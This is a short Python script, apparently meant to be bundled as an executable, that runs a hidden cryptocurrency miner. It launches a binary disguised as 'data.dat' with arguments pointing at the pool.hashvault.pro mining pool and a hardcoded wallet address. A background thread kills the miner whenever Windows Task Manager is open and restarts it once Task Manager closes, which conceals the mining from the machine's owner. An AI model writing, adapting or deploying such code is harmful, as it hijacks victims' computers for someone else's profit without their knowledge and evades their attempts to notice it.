import os
import sys
import subprocess
import psutil
import time
import threading   


def dosya_yolu(dosya_adı):
    if getattr(sys, 'frozen', False):
        return os.path.join(sys._MEIPASS, dosya_adı)
    else:
        return os.path.join(os.path.dirname(__file__), dosya_adı)
data = dosya_yolu("data.dat")

def start():
    subprocess.Popen(f"{dosya_yolu("data.dat")} --url pool.hashvault.pro:443 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x --tls", shell=True)


def kill():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            process.terminate()  # Programı sonlandır
            process.wait()  # Sonlanmasını bekle
            return True
    return False


def ifapp():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            return True
    return False


def is_task_manager_open():
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() == "taskmgr.exe":
            return True
    return False


def task_manager_watcher():
    while True:
        if is_task_manager_open():
            kill()
        elif not ifapp():
            subprocess.Popen(f"{data} --url pool.hashvault.pro:443 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x --tls", shell=True)
        time.sleep(1)


task = threading.Thread(target=task_manager_watcher)
task.start()

start()


